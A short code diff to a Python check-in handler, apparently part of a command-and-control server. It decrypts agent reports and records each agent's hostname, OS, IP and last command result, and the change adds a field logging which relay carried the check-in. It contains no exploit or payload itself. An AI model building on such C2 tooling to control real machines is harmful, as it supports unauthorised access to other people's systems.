@@ -31,11 +31,14 @@ def checkin():
         data = json.loads(decrypted_raw)
         host = data.get('hostname', 'unknown')
 
+        relay_used = request.headers.get('Host', 'Direct IP')
+
         # 2. Update the "Database"
         agents[host] = {
             'os': data.get('os', 'Unknown'),
             'last_seen': time.strftime('%H:%M:%S'),
             'ip': request.remote_addr,
+            'relay': relay_used,
             'last_result': agents.get(host, {}).get('last_result', 'No output yet')
         }
 
